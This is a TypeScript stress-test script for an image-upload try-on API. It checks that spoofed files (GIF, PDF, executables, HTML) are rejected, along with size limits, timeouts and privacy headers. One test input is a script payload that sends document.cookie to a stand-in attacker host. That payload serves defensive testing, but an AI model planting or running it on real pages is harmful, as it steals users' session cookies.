/**
 * Adversarial Critic Stress Test for Milestone 5: Hair Try-On Subsystem
 * Independently written by M5 Reviewer 2 (Critic & Reviewer)
 */

import { NextRequest } from 'next/server';
import { POST as tryOnRoute } from '../app/api/try-on/route';
import { inMemoryAuditLogs } from '../services/audit';
import { DemoHairTryOnProvider } from '../services/try-on/demo';

interface TestResult {
  category: string;
  name: string;
  passed: boolean;
  error?: string;
  details?: any;
}

const results: TestResult[] = [];

function check(condition: boolean, category: string, name: string, errMsg?: string, details?: any) {
  if (condition) {
    results.push({ category, name, passed: true, details });
    console.log(`  ✓ [PASS] [${category}] ${name}`);
  } else {
    results.push({ category, name, passed: false, error: errMsg, details });
    console.error(`  ✗ [FAIL] [${category}] ${name}: ${errMsg || 'Check failed'}`);
    if (details) console.error('    Details:', details);
  }
}

function createJsonRequest(body: any, headers: Record<string, string> = {}): NextRequest {
  return new NextRequest('http://localhost:3000/api/try-on', {
    method: 'POST',
    headers: {
      'content-type': 'application/json',
      ...headers,
    },
    body: JSON.stringify(body),
  });
}

async function runAdversarialCriticSuite() {
  console.log('================================================================================');
  console.log('       ADVERSARIAL CRITIC STRESS TEST: M5 HAIR TRY-ON PRIVACY PROXY');
  console.log('================================================================================\n');

  // --- Category 1: Malicious Byte Masquerading & MIME Spoofing ---
  console.log('▶ CATEGORY 1: Malicious Byte Masquerading & MIME Spoofing');

  // 1.1 GIF masquerading as image/jpeg
  const gifBuffer = Buffer.from('GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;');
  const resGif = await tryOnRoute(createJsonRequest({
    imageBuffer: gifBuffer,
    mimeType: 'image/jpeg',
    hairstyleId: 'hs-classic-bob',
  }));
  const dataGif = await resGif.json();
  check(
    resGif.status === 400 && dataGif.error?.includes('không được hỗ trợ'),
    'Security',
    'GIF masquerading as JPEG is detected and rejected with HTTP 400',
    `Status ${resGif.status}, error: ${dataGif.error}`
  );

  // 1.2 PDF masquerading as image/png
  const pdfBuffer = Buffer.from('%PDF-1.7\n1 0 obj<</Type/Catalog>>endobj\ntrailer<</Root 1 0 R>>\n%%EOF');
  const resPdf = await tryOnRoute(createJsonRequest({
    imageBuffer: pdfBuffer,
    mimeType: 'image/png',
    hairstyleId: 'hs-classic-bob',
  }));
  const dataPdf = await resPdf.json();
  check(
    resPdf.status === 400 && dataPdf.error?.includes('không được hỗ trợ'),
    'Security',
    'PDF document masquerading as PNG is detected and rejected with HTTP 400',
    `Status ${resPdf.status}, error: ${dataPdf.error}`
  );

  // 1.3 Windows PE Executable (MZ) masquerading as image/jpeg
  const peBuffer = Buffer.concat([Buffer.from('MZ\x90\x00\x03\x00\x00\x00'), Buffer.alloc(100)]);
  const resPe = await tryOnRoute(createJsonRequest({
    imageBuffer: peBuffer,
    mimeType: 'image/jpeg',
    hairstyleId: 'hs-classic-bob',
  }));
  const dataPe = await resPe.json();
  check(
    resPe.status === 400 && dataPe.error?.includes('không được hỗ trợ'),
    'Security',
    'Windows PE executable (MZ) masquerading as JPEG is detected and rejected with HTTP 400',
    `Status ${resPe.status}, error: ${dataPe.error}`
  );

  // 1.4 Linux ELF Executable (\x7fELF) masquerading as image/webp
  const elfBuffer = Buffer.concat([Buffer.from('\x7fELF\x02\x01\x01\x00'), Buffer.alloc(100)]);
  const resElf = await tryOnRoute(createJsonRequest({
    imageBuffer: elfBuffer,
    mimeType: 'image/webp',
    hairstyleId: 'hs-classic-bob',
  }));
  const dataElf = await resElf.json();
  check(
    resElf.status === 400 && dataElf.error?.includes('không được hỗ trợ'),
    'Security',
    'Linux ELF executable (\x7fELF) masquerading as WebP is detected and rejected with HTTP 400',
    `Status ${resElf.status}, error: ${dataElf.error}`
  );

  // 1.5 HTML tag masquerading as image/png
  const htmlBuffer = Buffer.from('<html><head><title>Test</title></head><body><h1>Phishing</h1></body></html>');
  const resHtml = await tryOnRoute(createJsonRequest({
    imageBuffer: htmlBuffer,
    mimeType: 'image/png',
    hairstyleId: 'hs-classic-bob',
  }));
  const dataHtml = await resHtml.json();
  check(
    resHtml.status === 400 && dataHtml.error?.includes('không được hỗ trợ'),
    'Security',
    'HTML document masquerading as PNG is detected and rejected with HTTP 400',
    `Status ${resHtml.status}, error: ${dataHtml.error}`
  );

  // 1.6 Script tag masquerading as image/jpeg
  const scriptBuffer = Buffer.from('<script>fetch("https://attacker.com/steal?"+document.cookie)</script>');
  const resScript = await tryOnRoute(createJsonRequest({
    imageBuffer: scriptBuffer,
    mimeType: 'image/jpeg',
    hairstyleId: 'hs-classic-bob',
  }));
  const dataScript = await resScript.json();
  check(
    resScript.status === 400 && dataScript.error?.includes('không được hỗ trợ'),
    'Security',
    'JavaScript <script> payload masquerading as JPEG is detected and rejected with HTTP 400',
    `Status ${resScript.status}, error: ${dataScript.error}`
  );

  // --- Category 2: Precise Boundary Checks ---
  console.log('\n▶ CATEGORY 2: Precise Boundary Conditions');

  // 2.1 0-byte buffer -> HTTP 400
  const emptyBuf = Buffer.alloc(0);
  const resZero = await tryOnRoute(createJsonRequest({
    imageBuffer: emptyBuf,
    mimeType: 'image/jpeg',
    hairstyleId: 'hs-classic-bob',
  }));
  check(
    resZero.status === 400,
    'Boundary',
    '0-byte buffer rejected with HTTP 400',
    `Status: ${resZero.status}`
  );

  // 2.2 Exact 5,242,880 bytes (5.0 MB) -> HTTP 200
  const exact5MB = Buffer.alloc(5 * 1024 * 1024, 0x41);
  const res5MB = await tryOnRoute(createJsonRequest({
    imageBuffer: exact5MB,
    mimeType: 'image/jpeg',
    hairstyleId: 'hs-classic-bob',
  }));
  check(
    res5MB.status === 200,
    'Boundary',
    'Exact 5.0 MB payload (5,242,880 bytes) is accepted (HTTP 200)',
    `Status: ${res5MB.status}`
  );

  // 2.3 Exact 5,242,881 bytes (5.0 MB + 1 byte) -> HTTP 413
  const overByOneByte = Buffer.alloc(5 * 1024 * 1024 + 1, 0x41);
  const resOverByOne = await tryOnRoute(createJsonRequest({
    imageBuffer: overByOneByte,
    mimeType: 'image/jpeg',
    hairstyleId: 'hs-classic-bob',
  }));
  const dataOver = await resOverByOne.json();
  check(
    resOverByOne.status === 413 && dataOver.error?.includes('vượt quá giới hạn tối đa'),
    'Boundary',
    'Payload over by 1 byte (5,242,881 bytes) is rejected with HTTP 413 Payload Too Large',
    `Status: ${resOverByOne.status}`
  );

  // --- Category 3: 15-Second Timeout Protection ---
  console.log('\n▶ CATEGORY 3: Timeout Protection Guard');

  // Set timeout env var to 50ms and provider delay to 300ms
  process.env.TRYON_TIMEOUT_MS = '50';
  process.env.TRYON_MIN_DELAY_MS = '300';
  process.env.TRYON_MAX_DELAY_MS = '400';

  const validImg = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==', 'base64');
  const resTimeout = await tryOnRoute(createJsonRequest({
    imageBuffer: validImg,
    mimeType: 'image/png',
    hairstyleId: 'hs-korean-wolf-cut',
  }));
  const dataTimeout = await resTimeout.json();

  check(
    resTimeout.status === 504 && dataTimeout.error?.includes('Timeout 15s'),
    'Timeout',
    'Slow simulation exceeding timeout limit triggers HTTP 504 Gateway Timeout',
    `Status: ${resTimeout.status}, Error: ${dataTimeout.error}`
  );

  // Reset timeout back to normal
  process.env.TRYON_TIMEOUT_MS = '15000';
  process.env.TRYON_MIN_DELAY_MS = '5';
  process.env.TRYON_MAX_DELAY_MS = '10';

  // --- Category 4: Biometric Privacy & Zero Disk Persistence ---
  console.log('\n▶ CATEGORY 4: Biometric Privacy Invariants');

  const resPrivacy = await tryOnRoute(createJsonRequest({
    imageBuffer: validImg,
    mimeType: 'image/png',
    hairstyleId: 'hs-korean-wolf-cut',
  }));
  const dataPrivacy = await resPrivacy.json();

  check(
    dataPrivacy.privacyValidated === true,
    'Privacy',
    'Response explicitly returns privacyValidated: true'
  );

  check(
    dataPrivacy.diskPath === undefined &&
      dataPrivacy.serverFilePath === undefined &&
      dataPrivacy.tempPath === undefined,
    'Privacy',
    'Response strictly omits diskPath, serverFilePath, and tempPath'
  );

  const cacheHeader = resPrivacy.headers.get('cache-control');
  const pragmaHeader = resPrivacy.headers.get('pragma');
  check(
    Boolean(cacheHeader?.includes('no-store')) &&
      Boolean(cacheHeader?.includes('no-cache')) &&
      pragmaHeader === 'no-cache',
    'Privacy',
    'Response headers mandate no-store, no-cache, and pragma: no-cache',
    `Cache-Control: ${cacheHeader}, Pragma: ${pragmaHeader}`
  );

  // Verify audit logs exclude raw biometric image
  const lastAudit = inMemoryAuditLogs[0];
  const auditString = JSON.stringify(lastAudit || {});
  check(
    lastAudit?.entity === 'TryOnSimulation' &&
      !auditString.includes(validImg.toString('base64')) &&
      !auditString.includes('imageBuffer'),
    'Privacy',
    'Audit logs record simulation metrics without storing raw biometric buffers or base64',
    `Audit details: ${JSON.stringify(lastAudit?.details)}`
  );

  // --- Category 5: Input Robustness & Intensity Edge Cases ---
  console.log('\n▶ CATEGORY 5: Input Robustness & Intensity Edge Cases');

  // 5.1 Negative intensity clamped
  const resNegIntensity = await tryOnRoute(createJsonRequest({
    imageBuffer: validImg,
    mimeType: 'image/png',
    hairstyleId: 'hs-classic-bob',
    options: { intensity: -99 },
  }));
  check(
    resNegIntensity.status === 200,
    'Robustness',
    'Negative intensity (-99) handled gracefully without server error'
  );

  // 5.2 Overflow intensity clamped
  const resOverIntensity = await tryOnRoute(createJsonRequest({
    imageBuffer: validImg,
    mimeType: 'image/png',
    hairstyleId: 'hs-classic-bob',
    options: { intensity: 99 },
  }));
  check(
    resOverIntensity.status === 200,
    'Robustness',
    'Overflow intensity (99) handled gracefully without server error'
  );

  // 5.3 Missing hairstyleId
  const resNoStyle = await tryOnRoute(createJsonRequest({
    imageBuffer: validImg,
    mimeType: 'image/png',
    hairstyleId: '',
  }));
  check(
    resNoStyle.status === 400,
    'Robustness',
    'Missing hairstyleId rejected with HTTP 400'
  );

  // Summary
  console.log('\n================================================================================');
  console.log('                         EXECUTION SUMMARY');
  console.log('================================================================================');
  const passedCount = results.filter((r) => r.passed).length;
  const failedCount = results.filter((r) => !r.passed).length;
  console.log(`  Total Probes:   ${results.length}`);
  console.log(`  Passed Probes:  ${passedCount}`);
  console.log(`  Failed Probes:  ${failedCount}`);

  if (failedCount > 0) {
    console.error('\n❌ CRITIC ADVERSARIAL STRESS TEST FAILED');
    process.exit(1);
  } else {
    console.log('\n✅ ALL CRITIC ADVERSARIAL STRESS PROBES PASSED CLEANLY');
    process.exit(0);
  }
}

runAdversarialCriticSuite().catch((err) => {
  console.error('Unhandled error in critic suite:', err);
  process.exit(1);
});
